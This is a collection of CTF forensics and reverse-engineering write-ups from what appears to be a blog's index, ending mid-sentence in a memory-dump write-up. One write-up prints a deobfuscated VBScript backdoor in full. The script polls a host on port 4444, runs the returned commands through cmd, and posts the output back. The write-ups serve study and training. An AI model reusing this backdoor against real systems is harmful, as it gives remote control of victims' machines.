the correct password for the executable? Well, we first need to review its code. If you run the ‘file’ command on the given file, you will find out that this is a Mono/.Net assembly, and if you search up with how to decompile (reverse) these type of programs/applications, a tool named DnSpy will come up which is a tool used for exactly that – decompile/debug .net executables.\nHaving DnSpy installed in your system, simply drag and drop the .exe to it:\nNow, there are plenty of ways to go about solving this challenge. The easier way is to put a breakpoint at the line where it checks our input with the correct decrypted passphrase:\nStepping over the breakpoint, we will see that the variable “value” now holds the decrypted passphrase:\nWe can actually modify the “text” = “test” value to the real password in order to bypass the check and get the flag:\nStepping over once again, we pass the if statement and get the decrypted flag:\nFlag: \u0026ldquo;FLAG{y0u_unl0ck3d_7h3_f029073n_53c2375}\u0026rdquo;\nWe could also just rerun the program and provide the correct passphrase.\n","permalink":"http://localhost:1313/ctfwriteups/ancientcavevault/","summary":"This is a ‘secret password’ type of challenge, where we need to somehow reverse engineer the given executable and find the correct password:\nAfter the final wrong attempt, the executable closes:\nSo how can we find the correct password for the executable? Well, we first need to review its code. If you run the ‘file’ command on the given file, you will find out that this is a Mono/.Net assembly, and if you search up with how to decompile (reverse) these type of programs/applications, a tool named DnSpy will come up which is a tool used for exactly that – decompile/debug .","title":"Ancient Cave Vault - Writeup"},{"content":"Upon decompressing the provided file, we were presented with a Word document. Opening it, we are presented with the following:\nAvoiding to click on “Enable Content”, we navigate to the panel where the macro code exists and see the following seemingly obfuscated VBA code:\nOne way we can deobfuscate this is utilizing the ChatGPT AI service:\nJust by asking ChatGPT to deobfuscate the code, we are provided with a much more clear version of the found macros.\nUnfortunately, this will end up being a dead end and will give us no leads whatsoever about finding the flag. In cases like this, we should turn to tools such as “olevba”, which is a tool that automates the analysis of seemingly malicious docs and provides the artifacts found. The tool is simply run by executing the following command:\nolevba [document_name] and can be found at:\nhttps://github.com/decalage2/oletools/wiki/olevba Running it, we get the following output:\nThis is the code we previously found manually. At the end of the output though, we get the following summary table:\nThe most interesting line here is the last one which refers to something called VBA stomping. Also, we get some extra output regarding the VBA stomping:\nBut this will not lead to anywhere, since the olevba tool itself refers to VBA detection being in an experimental stage. Searching further on what VBA stomping is, we get the following references:\nSo the results makes a reference on something called p-code. Continuing our search on how to analyze p-code of a document, we find references to the following tools:\nhttps://github.com/Big5-sec/pcode2code https://github.com/bontchev/pcodedmp We can download and use the first tool like:\nwhich dumped the p-code into res.txt file. Let’s open and see what is inside this file:\nEverytime we have to do with obfuscated code, we start with what we can reverse. We see a bunch of chr() and XOR operations which are reversable. So we will start by recovering the strings that these operators generate. We will create a python script that will compute these chr() operations and print us the result:\nWe made some modifications to match python syntax, such as:\nremoving the space character replacing the “\u0026amp;” with “+” in order to concatenate strings replacing “Xor” with “^” to make XOR operations replacing capital ‘C’ to lowercase ‘c’ since pythons chr() function uses a lowercase ‘c’. Then, we used eval() to run the commands stored in the string. The result we end up with is “System.Security.Cryptography.ToBase64Transform”. Doing this operation for the rest of the code, we end up with:\nWe also spot some mathematical operations, which again are easily reversable:\nFrom the resulted code, we spot that the function vwvwdew() is first executed, which calls a function called yocce(), giving it a string parameter. This function initializes some variables and objects. One of the objects it initializes is:\nSo onixhh object is basically a System.Security.Cryptography.RijndaelManaged object. Googling what that is we find that it is an AES predecessor algorithm:\nSo we can rename this object to AES instead. We then see that a call is being made to ltrcd function with the string we originally passed as argument to yocce() function. Let’s see what this function does:\nSo this function takes the string that was passed as argument and base64 decodes it. Then it gets the resulted bytes and returns them in the yocce() function. Then, yocce() function takes the resulted base64 decoded string and encrypts it:\nIt then calls frjwlq() function with the resulted encrypted string as argument:\nwhere it is base64 encoded again and returned. So we can safely assume that the original base64 encoded string that was passed as argument originally was a base64 encoded string. Since this VBA script is trivial, there is no much more to it. Trying to decode the original base64 string that was passed early on in the code, we get the flag:\n\u0026gt;\u0026gt;\u0026gt; from base64 import b64decode \u0026gt;\u0026gt;\u0026gt; b64decode(b\u0026#34;Q1RGTElCe2M0MjNmdWxsXzBmXzdoM19wLWMwZDMhIX0=\u0026#34;) b\u0026#39;CTFLIB{c423full_0f_7h3_p-c0d3!!}\u0026#39; \u0026gt;\u0026gt;\u0026gt; ","permalink":"http://localhost:1313/ctfwriteups/anothermaliciousdoc/","summary":"Upon decompressing the provided file, we were presented with a Word document. Opening it, we are presented with the following:\nAvoiding to click on “Enable Content”, we navigate to the panel where the macro code exists and see the following seemingly obfuscated VBA code:\nOne way we can deobfuscate this is utilizing the ChatGPT AI service:\nJust by asking ChatGPT to deobfuscate the code, we are provided with a much more clear version of the found macros.","title":"Another malicious doc - Writeup"},{"content":"For this challenge you would normally fire up a docker instance that unfortunately you can\u0026rsquo;t have access at the time, but the py script that runs on the server is provided to you in case you need to run it locally. Now, onto the chall!\nThe concept of this challenge is about rainbow table attacks. The user is given the 5 first characters of an md5 hash of a random hex string. The goal is to compute all possible md5 hashes and construct a dictionary with key being the 5-characters start of the hash and value being the original string. Basically, this challenge’s code is its solution.\nExploitation Connecting with netcat to the challenge,we get the following:\n┌──(aastro㉿kali)-[~/ecsc/ctflib/challenge]\r└─$ nc protons.ddns.net 50769\rEnter a string in hex whose md5 hash starts with: \u0026#34;00713\u0026#34; Since it asks for a string whose hash begins with ‘xxxxx’.length == 5 and since it says the string is in hex, we come to the conclusion that all possible combinations are finite, meaning we can compute all possible combinations and match the correct one. All possible combinations are 16^5 = 1.048.576 .This is because we want to compute all possible combinations to get the correct first 5 characters of the hash, and since we are talking about hex, every character can be from 0 – F.\nNow to the solution.\nWe know how many combinations we need to calculate. So we need to make a loop which computes a new md5 hash combination of a random hex string each time. These hex strings are unique each time. In every loop, we store the first 5 characters as a key to a dictionary and the corresponding value to that key will be the original string from which these 5 characters came from. We need to make it this way so when the challenge asks for the beginning of a hashed string, we will simply pass to our script the start of the hash that is given, and we will get back the corresponding string.\nLet’s see the script:\nimport hashlib import secrets rainbowTable = {} while len(rainbowTable.keys())\u0026lt; 0xffff0: s = secrets.token_hex(16) m = hashlib.md5() m.update(s.encode(\u0026#39;ascii\u0026#39;)) h = m.hexdigest()[:5] rainbowTable[h] = s inp = input(\u0026#34;Enter start of hash: \u0026#34;) for k in rainbowTable.keys(): if inp == k: print(\u0026#34;Corresponding string is: \u0026#34;,rainbowTable[k]) break Lines 1,2 : We import the necessary libraries. Line 4 : We create our dictionary. Line 5 : We start the loop. We want the loop to run until the length of the dictionary reaches the value of fffff (which is the value we calculated before) so we get all the possible combinations. Line 6 : From the documentation This way we start calculating the hex values.\nLine 7,8 : We initialize a variable that will be used for hashing, and we pass it the hex value we just calculated. Line 9 : We then take the first 5 characters of the hashed string and pass them to a variable that will be used as a key. Line 10 : We create a key-value pair in our dictionary with key being the previous 5 characters from the hashed value and value being the original string before being hashed. Lines 12,13,14,15 : These are used to find the corresponding value of the key given. So lets run the challenge and our script :\nIn the left, we have the challenge running, and in the right we have our script. Passing the start of the hashed string to our script, we get the corresponding string to this hashed start. So, we turn back to the challenge and pass the string that we got from our script, which is the correct one so we get the flag: CTFLIB{4nTI-hUM4NS_C4PTCHA__}\n","permalink":"http://localhost:1313/ctfwriteups/captcha4humans/","summary":"For this challenge you would normally fire up a docker instance that unfortunately you can\u0026rsquo;t have access at the time, but the py script that runs on the server is provided to you in case you need to run it locally. Now, onto the chall!\nThe concept of this challenge is about rainbow table attacks. The user is given the 5 first characters of an md5 hash of a random hex string.","title":"captcha 4 humans - Writeup"},{"content":"Upon opening the file, we are presented with a memory dump and a batch script. Initially, the batch script appears to have been obfuscated:\nMoreover, the memory dump alone does not yield any useful insights.\nTherefore, the initial approach is to utilize search engines, such as Google, to gain an understanding of the nature and potential purpose of the batch script:\nUpon conducting a search, we discover several posts that appear to be relevant to the challenge and could potentially guide us towards a solution.\nOf particular interest is the first post, which features a script that bears a striking resemblance to our own:\nThis post states the following:\nFor further reading, this post can be found at:\nhttps://superuser.com/questions/1676713/how-to-decode-contents-of-a-batch-file-with-chinese-characters So let’s try to follow these steps and open the batch script in the hex editor HxD: And it worked. We now have a less obfuscated script of which we can make notice of some readable characters.\nLet’s copy the whole hex block to cyberchef and convert it to ascii:\nTo continue on with the next level of deobfuscation, let’s copy the code to notepad (or any other text editor) in order to make some modifications if needed:\nWe can spot some readable words such as cls, public and envPolisus.\nThe remaining text appears to be concealed using a second stage of obfuscation, marked by the \u0026quot; %:~\u0026quot; symbols.\nWe can refer to the earlier post we analyzed, which provides an example on how to deobfuscate code employing this technique.\nNotably, these symbols are frequently utilized in VBA syntax and CMD variables. In CMD or VBA, variables are created using the \u0026ldquo;set\u0026rdquo; command, and their contents can be retrieved by enclosing the variable name within percentage symbols (\u0026quot;%\u0026quot;):\nC:\\Users\\connar\u0026gt;set example=\u0026#34;This is an example\u0026#34;\rC:\\Users\\connar\u0026gt;%example%\r\u0026#39;\u0026#34;This is an example\u0026#34;\u0026#39; is not recognized as an internal or external command,\roperable program or batch file. Additionally, the unusual \u0026ldquo;:~number, number\u0026rdquo; patterns that we observed earlier in the script serve to extract specific portions of a value that has been stored in a variable. For instance:\nC:\\Users\\connar\u0026gt;%example:~12,2%\r\u0026#39;ex\u0026#39; is not recognized as an internal or external command,\roperable program or batch file.\rC:\\Users\\connar\u0026gt;%example:~12,1%\r\u0026#39;e\u0026#39; is not recognized as an internal or external command,\roperable program or batch file. To illustrate, consider the following examples:\n%example:~12%: This command counts 12 positions from the beginning of the \u0026ldquo;example\u0026rdquo; string, and then returns the remaining characters of the string, which is \u0026ldquo;example\u0026rdquo;. %example:~12,2%: This command counts 12 positions from the start of the \u0026ldquo;example\u0026rdquo; string, returns the remaining characters of the string (\u0026ldquo;example\u0026rdquo;), and then extracts the first two characters, which are \u0026ldquo;ex\u0026rdquo;. %example:~12,1%: This command counts 12 positions from the beginning of the \u0026ldquo;example\u0026rdquo; string, returns the remaining characters of the string (\u0026ldquo;example\u0026rdquo;), and then retrieves the first character, which is \u0026ldquo;e\u0026rdquo;. It appears that this technique is a form of obfuscation known as environment variable obfuscation, which constructs commands using letters stored in Windows environment variables. By utilizing this method, the obfuscated code can avoid detection, as it does not rely on known malicious commands in plain text. Instead, the commands are assembled during runtime. To deobfuscate the code, we can proceed line by line through the script and enter each line into the terminal using the \u0026ldquo;echo\u0026rdquo; command to observe its behavior:\nIt\u0026rsquo;s worth noting that the terminal treats uppercase and lowercase variables as equivalent. For example, \u0026ldquo;R\u0026rdquo; is the same as \u0026ldquo;r\u0026rdquo;. Additionally, the \u0026ldquo;^\u0026rdquo; symbol needs to be escaped in the command.\nWe can see that the script checks if an environment variable called envPolisus is empty. If it is, it prints:\nC:\\Users\\connar\u0026gt;echo ec%r:~11,1%o Co%r:~13,1%ld no%r:~4,1% %r:~13,1%pda%r:~4,1%e yo%r:~13,1%r %r:~9,1%%r:~2,1%ndo%r:~9,1%%r:~8,1%\recho Could not update your windows In the case where the environment variable exists, the script continues execution.\nIf we wanted to run this script in an isolated environment, we could set this variable to something and this script would continue executing, so we could analyze it dynamically (for example with Wireshark to see if it tries to connect to somewhere).\nContinuing on:\nIt tries to run a Powershell command which essentially gets the value of envPolisus variable, and then gets its SHA256 hash and stores it in a file.\nIt then reads from this file and checks if the hash it read is equal to:\nIf it is, it continues executing. If its not, it prints a message and stops.\nThe \u0026ldquo;envPolisus\u0026rdquo; variable as we can see gets used a lot, and while we have its SHA256 hash, attempting to crack it with hashcat would likely be a dead end. However, we do have access to the memory dump that was provided to us.\nAlthough we may not have the \u0026ldquo;envPolisus\u0026rdquo; variable set on our own system, the system from which the memory dump was taken might. By using a tool like Volatility, we can attempt to locate this variable in the memory dump:\nAnd we get the first part of the flag!\nThe sha256 sum of this string is really the hash displayed on the script:\n\u0026gt;\u0026gt;\u0026gt; from hashlib import sha256 \u0026gt;\u0026gt;\u0026gt; part1 = b\u0026#34;CTFLIB{50m4l1_p12473_\u0026#34; \u0026gt;\u0026gt;\u0026gt; sha256(part1).hexdigest() \u0026#39;f590ad9a61d196447f3832ab3b3ba449e45b381aaf0bfa6de07d08f2d4de5a9a\u0026#39; \u0026gt;\u0026gt;\u0026gt; Continuing on with the analysis, we have:\nBasically, it uses this “lru” variable, which is automatically deobfuscated from our echo command, to download whatever is in this url and stores it in a file called windowsUpdater.ps1:\nOnce the contents of the Pastebin post have been downloaded and stored in the \u0026ldquo;windowsUpdater.ps1\u0026rdquo; file, the script attempts to locate and execute this file, assuming that the download was successful:\nThe script uses a loop to search for a corresponding file, and if it finds one, it saves the file name to a variable called \u0026ldquo;p\u0026rdquo; and executes it with Powershell. If everything has gone successfully, this is the end of the script. However, we still have not found the second part of the flag. Perhaps we can find it by visiting the Pastebin post mentioned in the script:\nVisiting the Pastebin post, we can see more Powershell code which thankfully is not so obfuscated this time.\nWhat catches our eyes is a weirdly big string that looks like base64 encoded. Copying it and decoding it in Cyberchef, we get:\nIt tries to download even more files. The file it tries to download again looks like its base64 encoded. Trying to decode it we get the second part of the flag:\n\u0026gt;\u0026gt;\u0026gt; from base64 import b64decode \u0026gt;\u0026gt;\u0026gt; b64decode(b\u0026#34;MDZmdTVjNDcxMG5fMTVfcHIzNzd5X24zNDd9\u0026#34;) b\u0026#39;06fu5c4710n_15_pr377y_n347}\u0026#39; ","permalink":"http://localhost:1313/ctfwriteups/chinesewindowsupgrader/","summary":"Upon opening the file, we are presented with a memory dump and a batch script. Initially, the batch script appears to have been obfuscated:\nMoreover, the memory dump alone does not yield any useful insights.\nTherefore, the initial approach is to utilize search engines, such as Google, to gain an understanding of the nature and potential purpose of the batch script:\nUpon conducting a search, we discover several posts that appear to be relevant to the challenge and could potentially guide us towards a solution.","title":"Chinese Windows Updater - Writeup"},{"content":"Unzipping the provided file, we extract the following files:\nThis time we don’t have only a “.pcap” file but also a file named sslkeylog.log, which when opened does not make a lot of sense:\nSo we will ignore this for now and open the provided “.pcap” file with Wireshark:\nThis time, packets are not that clear as in the previous challenge. We have a lot more packets and many different protocols. To view all protocols detected by Wireshark, we can navigate to “Statistics  Protocol Hierarchy” and get the following information:\nSearching for HTTP requests, which in most cases reveal almost immediately fruitful information leads to a dead end:\nWe turn back to the protocol hierarchy and we see that TLS is used about 21% from the total network traffic protocol types. Googling what TLS is, we find out that it is a protocol used for encrypting data before being sent over the internet.\nSo, since we can’t see the full traffic because of the encryption, we ideally would like to decrypt it. Searching for how to decrypt TLS traffic in Wireshark we find the following:\nWe remember that a log file is given to us, so it seems like we are in the right track. Reading the article, the following steps are suggested:\nFollowing the steps above and providing the sslkeylog.log as the (Pre)-Master-Secret log filename decrypts the traffic:\nWe can finally start to see clear packets. Revisiting “http” requests though leads to the same packets we previously found. If we enumerate the whole decrypted “.pcap”, we will notice (just like in the previous image) that we indeed have some “GET” requests, but with HTTP2 protocol. HTTP2 is basically an HTTP variant that compresses data more:\nFiltering for “HTTP2” requests, we are met with the following packets:\nWe can see a lot of GET requests, some POST requests and some responses.\nWe can play with the filters and use one like the following for more organized results:\nHere I used a specific filter for “GET” requests in HTTP2 protocol and also chose the destination to be the ip “104.20.67.143” since all the strange GET requests were send to this domain. Taking about domains, looking at one of the packets, we see that this destination ip is actually this domain:\n\u0026gt; Header: :authority: pastebin.com \u0026gt; Header: :scheme: https \u0026gt; Header: :path: /79CbDmEE Googling what “Pastebin.com” is makes the traffic we found even more suspicious. We will find out that it is a website that allows users to share plaintext through public posts called \u0026ldquo;pastes\u0026rdquo;. It is common for hackers to upload payloads or leaked information there to be able to reference them later on.\nMaybe a flag has been posted to one of the paths found in Wireshark?\nSince we have a lot of “GET /path” requests, instead of navigating manually to each one, we are going to create a python script to automate this process.\nI ended up with the following:\nimport pyshark import requests import re cap = pyshark.FileCapture(\u0026#34;patterns.pcapng\u0026#34;,display_filter=\u0026#39;(http2.header.value==\u0026#34;GET\u0026#34;) and (http2.header.value contains pastebin) and (http2.header.name.length \u0026gt; 18)\u0026#39;) pkts = [p for p in cap] for packet in pkts: path = packet.http2.stream.split(\u0026#39;,\u0026#39;)[-1][5:] url = \u0026#34;https://pastebin.com\u0026#34;+str(path) r = requests.get(url) if \u0026#34;CTFLIB\u0026#34; in r.text: print(\u0026#34;path which has the flag is : \u0026#34;+str(path)) match = re.search(r\u0026#39;[\\w]+{[\\w]+}\u0026#39;, r.text) \u0026#39;\u0026#39;\u0026#39; the above match translates to : [anystring]{[anystring]} basically any string that is followed by \u0026#39;{\u0026#39;, then contains any string that is followed by \u0026#39;}\u0026#39; \u0026#39;\u0026#39;\u0026#39; print(match.group(0)) break Breakdown of the code:\nImport pyshark library. This library is mimicking Wireshark into a script. By doing this, we can read “.pcap” files and use filters to minimize the results as we saw previously. Here, I used a different filter than the previous one only to showcase a different approach. This script reads the “.pcap” file with the given filter and loops through each packet. It then tries to extract all /[paths] from the GET requests we saw. After it finds the path, it constructs a url with the domain we found (Pastebin) and the path we extracted. It makes a request to the constructed url and uses regular expression to see if the response contains a string that matches the flag format of the challenge. If it does, it prints the flag as well as the path it was found at. Running the code, we get the flag:\n┌──(connar㉿kali)-[~/flagontherun]\r└─$ python pysharkfilter.py\rpath which has the flag is : /mGzAUAg2\rCTFLIB{fl4g_1n_6u6l1c_51gh7} ","permalink":"http://localhost:1313/ctfwriteups/flagontherun/","summary":"Unzipping the provided file, we extract the following files:\nThis time we don’t have only a “.pcap” file but also a file named sslkeylog.log, which when opened does not make a lot of sense:\nSo we will ignore this for now and open the provided “.pcap” file with Wireshark:\nThis time, packets are not that clear as in the previous challenge. We have a lot more packets and many different protocols.","title":"Flag on the run - Writeup"},{"content":"We\u0026rsquo;ve been given a game to analyze that is supposedly malicious. Downloading the Game.rar file, we are met with an executable named \u0026ldquo;GTAVI.exe\u0026rdquo;.\nUpon running it inside a Virtual Machine (which should never be done in local systems when analyzing malware), the following error messages appear:\nAnd after clicking the \u0026lsquo;OK\u0026rsquo; button:\nSince we know that there is more to the challenge than just error messages, we ignore them and try to analyze the executable inside Ghidra tool which is basically a reverse engineering tool. This will end up being a rabbit whole. The most informative artifact we can find is the following:\nSearching what “ExeScript” is, we find that it is a tool that converts scripts to executables. So our file isn’t really an executable, but a script written in some programming language that is yet unknown to us, and that got later converted to an executable.\nThe Ghidra tool, or any other tool in general won’t help us analyze it further. We have to keep in mind that this is not a reverse engineering challenge but a forensic one, so we should instead focus and analyze the file itself since we know that it is some script masked as executable.\nThere are plenty ways to do this, with the simpler being windows dir command line options which reveals information about a file based on the option specified. Let’s try out a few options to see what is file really is. In windows, we can get information about a file with the dir command. To view some of the most popular options for dir, we can run help dir in cmd:\nStarting to try a few of the options, we get to a strange output in the dir /r one which according to the help manual shows alternate data streams of the file:\nThis output was far more interesting than the rest. It displays a “wininit.vbs” file and “$DATA” specifier at the end. Not knowing what Alternate data streams are, we google it. Immediately after we search it up, we get a lot of articles referring to this as a technique for hackers to store malicious payloads inside a file:\nSo we are definitely in the right track. We see that Alternate data streams are used to hide data inside a file. Ideally we would like to extract the data hidden in the GTAVI.exe, which in our case is a script called “wininit.vbs”.\nTurning back to google, we find that there are various ways to extract hidden ADS data inside a file, with one being the following Powershell command:\nPS C:\\Users\\connar\u0026gt; Get-Content -path .\\GTAVI.exe -Stream wininit.vbs Execute(chr(-658+CLng(\u0026#34;\u0026amp;H2e1\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;H9e\u0026#34;)-46)\u0026amp;chr(-84831+CLng(\u0026#34;\u0026amp;H14bd3\u0026#34;))\u0026amp;chr(3372810/CLng(\u0026#34;\u0026amp;H7d7a\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;H13c99\u0026#34;)-80938)\u0026amp;chr(6582950/CLng(\u0026#34;\u0026amp;He9c5\u0026#34;))\u0026amp;chr(1184000/CLng(\u0026#34;\u0026amp;H9088\u0026#34;))\u0026amp;chr(2118990/CLng(\u0026#34;\u0026amp;H77f6\u0026#34;))\u0026amp;chr(-49617+CLng(\u0026#34;\u0026amp;Hc249\u0026#34;))\u0026amp;chr(-72592+CLng(\u0026#34;\u0026amp;H11c00\u0026#34;))\u0026amp;chr(8797896/CLng(\u0026#34;\u0026amp;H13e36\u0026#34;))\u0026amp;chr(1559775/CLng(\u0026#34;\u0026amp;H3a07\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;H1f38\u0026#34;)-7893)\u0026amp;chr(CLng(\u0026#34;\u0026amp;H741\u0026#34;)-1752)\u0026amp;chr(-40228+CLng(\u0026#34;\u0026amp;H9d98\u0026#34;))\u0026amp;chr(-219+CLng(\u0026#34;\u0026amp;He5\u0026#34;))\u0026amp;chr(-51578+CLng(\u0026#34;\u0026amp;Hc9c9\u0026#34;))\u0026amp;chr(3908740/CLng(\u0026#34;\u0026amp;H8ace\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;H13bea\u0026#34;)-80842)\u0026amp;chr(CLng(\u0026#34;\u0026amp;Hac70\u0026#34;)-44075)\u0026amp;chr(4605144/CLng(\u0026#34;\u0026amp;H9dcc\u0026#34;))\u0026amp;chr(3951240/CLng(\u0026#34;\u0026amp;H8764\u0026#34;))\u0026amp;chr(-43857+CLng(\u0026#34;\u0026amp;Habc0\u0026#34;))\u0026amp;chr(-85810+CLng(\u0026#34;\u0026amp;H14fa4\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;H75ee\u0026#34;)-30158)\u0026amp;chr(2633266/CLng(\u0026#34;\u0026amp;H7d71\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;H118e\u0026#34;)-4393)\u0026amp;chr(4670380/CLng(\u0026#34;\u0026amp;H9ea4\u0026#34;))\u0026amp;chr(4316130/CLng(\u0026#34;\u0026amp;H901a\u0026#34;))\u0026amp;chr(-34584+CLng(\u0026#34;\u0026amp;H8785\u0026#34;))\u0026amp;chr(464297/CLng(\u0026#34;\u0026amp;H11f5\u0026#34;))\u0026amp;chr(1108032/CLng(\u0026#34;\u0026amp;H8742\u0026#34;))\u0026amp;chr(-60845+CLng(\u0026#34;\u0026amp;Hedfb\u0026#34;))\u0026amp;chr(7913047/CLng(\u0026#34;\u0026amp;H1320b\u0026#34;))\u0026amp;chr(-36133+CLng(\u0026#34;\u0026amp;H8d9d\u0026#34;))\u0026amp;chr(10981024/CLng(\u0026#34;\u0026amp;H171c8\u0026#34;))\u0026amp;chr(455520/CLng(\u0026#34;\u0026amp;Hb1f0\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;H15525\u0026#34;)-87323)\u0026amp;chr(CLng(\u0026#34;\u0026amp;Hc375\u0026#34;)-49970)\u0026amp;chr(6283344/CLng(\u0026#34;\u0026amp;H136b0\u0026#34;))\u0026amp;chr(1773486/CLng(\u0026#34;\u0026amp;H58d1\u0026#34;))\u0026amp;chr(-22086+CLng(\u0026#34;\u0026amp;H5699\u0026#34;))\u0026amp;chr(7773360/CLng(\u0026#34;\u0026amp;H1697c\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;H6edb\u0026#34;)-28347)\u0026amp;chr(-44523+CLng(\u0026#34;\u0026amp;Hae4e\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;H13f72\u0026#34;)-81681)\u0026amp;chr(1170396/CLng(\u0026#34;\u0026amp;H2a55\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;Hdc9e\u0026#34;)-56370)\u0026amp;chr(-7656+CLng(\u0026#34;\u0026amp;H1e4a\u0026#34;))\u0026amp;chr(4666088/CLng(\u0026#34;\u0026amp;Hbbe8\u0026#34;))\u0026amp;chr(-9737+CLng(\u0026#34;\u0026amp;H266c\u0026#34;))\u0026amp;chr(-67498+CLng(\u0026#34;\u0026amp;H10815\u0026#34;))\u0026amp;chr(-88804+CLng(\u0026#34;\u0026amp;H15b39\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;H15b7f\u0026#34;)-88845)\u0026amp;chr(-87680+CLng(\u0026#34;\u0026amp;H156ec\u0026#34;))\u0026amp;chr(110016/CLng(\u0026#34;\u0026amp;Hd6e\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;Ha5e7\u0026#34;)-42410)\u0026amp;chr(CLng(\u0026#34;\u0026amp;He821\u0026#34;)-59393)\u0026amp;chr(-60882+CLng(\u0026#34;\u0026amp;Hedf4\u0026#34;))\u0026amp;chr(4223960/CLng(\u0026#34;\u0026amp;H9ea7\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;Hde5c\u0026#34;)-56808)\u0026amp;chr(156600/CLng(\u0026#34;\u0026amp;H546\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;H2119\u0026#34;)-8361)\u0026amp;chr(-14255+CLng(\u0026#34;\u0026amp;H37e9\u0026#34;))\u0026amp;chr(1476458/CLng(\u0026#34;\u0026amp;H7ab6\u0026#34;))\u0026amp;chr(169153/CLng(\u0026#34;\u0026amp;He0f\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;H138d7\u0026#34;)-80038)\u0026amp;chr(CLng(\u0026#34;\u0026amp;H11d8d\u0026#34;)-73044)\u0026amp;chr(2498000/CLng(\u0026#34;\u0026amp;Hc328\u0026#34;))\u0026amp;chr(-28775+CLng(\u0026#34;\u0026amp;H7095\u0026#34;))\u0026amp;chr(-38472+CLng(\u0026#34;\u0026amp;H9679\u0026#34;))\u0026amp;chr(4931118/CLng(\u0026#34;\u0026amp;H164b5\u0026#34;))\u0026amp;chr(2246720/CLng(\u0026#34;\u0026amp;H9cb8\u0026#34;))\u0026amp;chr(2820444/CLng(\u0026#34;\u0026amp;Hef82\u0026#34;))\u0026amp;chr(3714006/CLng(\u0026#34;\u0026amp;Hfe86\u0026#34;))\u0026amp;chr(-70681+CLng(\u0026#34;\u0026amp;H11452\u0026#34;))\u0026amp;chr(4318066/CLng(\u0026#34;\u0026amp;H16eaf\u0026#34;))\u0026amp;chr(1358761/CLng(\u0026#34;\u0026amp;H6425\u0026#34;... And we get a lot of nonsense, which seems to be obfuscated code (whenever we have text that seems confusing, it is most probably been obfuscated).\nSo how do we go about recovering the actual context ?\nWe see that the hidden file is named “wininit.vbs”. We must pay attention in the “vbs” extension. With the info we have so far, we can search for how to deobfuscate vbs, which will essentially lead us to the following online tool:\nhttps://isvbscriptdead.com/vbs-obfuscator/ Visiting the online tool, it is suggested to replace the “Execute” keyword in our output with “MsgBox”, store this in a new file with “vbs” extension and run it. Following these instructions and running the script, we get the deobfuscated code:\nOption Explicit\rOn Error Resume Next\rCONST callbackUrl = \u0026#34;http://192.168.99.5:4444/\u0026#34;\rDim xmlHttpReq, shell, execObj, command, break, result\rSet shell = CreateObject(\u0026#34;WScript.Shell\u0026#34;)\rbreak = False\rfso = \u0026#34;Q1RGTElCe2gxZGQxbmdfMW5fdEgzX3N0UjM0bX0=\u0026#34;\rWhile break \u0026lt;\u0026gt; True\rSet xmlHttpReq = WScript.CreateObject(\u0026#34;MSXML2.ServerXMLHTTP\u0026#34;)\rxmlHttpReq.Open \u0026#34;GET\u0026#34;, callbackUrl, false\rxmlHttpReq.Send\rcommand = \u0026#34;cmd /c\u0026#34; \u0026amp; Trim(xmlHttpReq.responseText)\rif InStr(command, \u0026#34;EXIT\u0026#34;) Then\rbreak = True\rElse\rSet execObj = shell.Exec(command)\rresult = \u0026#34;\u0026#34;\rDo Until execObj.StdOut.AtEndOfStream\rresult = result \u0026amp; execObj.StdOut.ReadAll()\rLoop\rSet xmlHttpReq = WScript.CreateObject(\u0026#34;MSXML2.ServerXMLHTTP\u0026#34;)\rxmlHttpReq.Open \u0026#34;POST\u0026#34;, callbackUrl, false\rxmlHttpReq.Send(result)\rEnd If\rWend We are met with this deobfuscated VBS script. Analyzing the script further does not lead to anything interesting. The only thing that is suspicious is a variable called fso that is not used at all in the script. This variable is equal to a value that seems like a base64 encoded string (because of the equal sign in the end).\nTrying to decode it with CyberChef, we get a flag:\n\u0026gt;\u0026gt;\u0026gt; from base64 import b64decode \u0026gt;\u0026gt;\u0026gt; b64decode(\u0026#34;Q1RGTElCe2gxZGQxbmdfMW5fdEgzX3N0UjM0bX0=\u0026#34;) b\u0026#39;CTFLIB{h1dd1ng_1n_tH3_stR34m}\u0026#39; \u0026gt;\u0026gt;\u0026gt; Turns out that sometimes the simplest ways to analyze a file goes unnoticed to an analyst. We saw that the power of a reverse tool could not help at all, but some simple command line options solved the problem.\nThis shows that not all tools can be used for all the problems.\n","permalink":"http://localhost:1313/ctfwriteups/headstream/","summary":"We\u0026rsquo;ve been given a game to analyze that is supposedly malicious. Downloading the Game.rar file, we are met with an executable named \u0026ldquo;GTAVI.exe\u0026rdquo;.\nUpon running it inside a Virtual Machine (which should never be done in local systems when analyzing malware), the following error messages appear:\nAnd after clicking the \u0026lsquo;OK\u0026rsquo; button:\nSince we know that there is more to the challenge than just error messages, we ignore them and try to analyze the executable inside Ghidra tool which is basically a reverse engineering tool.","title":"Headstream - Writeup"},{"content":"Extracting the contents of the zip file, we are met with a \u0026ldquo;Win7x64.mem” file. This is a memory dump file and can be analyzed with various tools. One of the tools that can analyze these type of files is called Volatility. Let’s see how it is used:\nVolatility, based on the provided file, tries to match what type of system this dump was taken from. The first suggestion it makes is Win7SP1x64 which is basically Windows 7 – 64 bit.\nNow that we have a profile for our memory dump file, we have to locate the password hint inside the memory dump in order to analyze it. Google will help us in this task:\nAlthough the Microsoft community forum does not show the full path, it suggests to look at the SAM (Security Account Manager) hive:\nSorry, I have no idea about the structure of the SAM file and where this information might be kept. Here are a couple of options:\r- Use a search engine in an attempt to find discussions that deal with this subject.\r- Take a copy of the SAM, then create a hint.Now take another copy and compare the two versions, using fc.exe /b. This community forum can be found at:\nhttps://answers.microsoft.com/en-us/windows/forum/all/user-account-password-hint-registry-location/596030e0-6b72-46ef-97bf-fdc77b3632c9 We will update our search based on the information found and 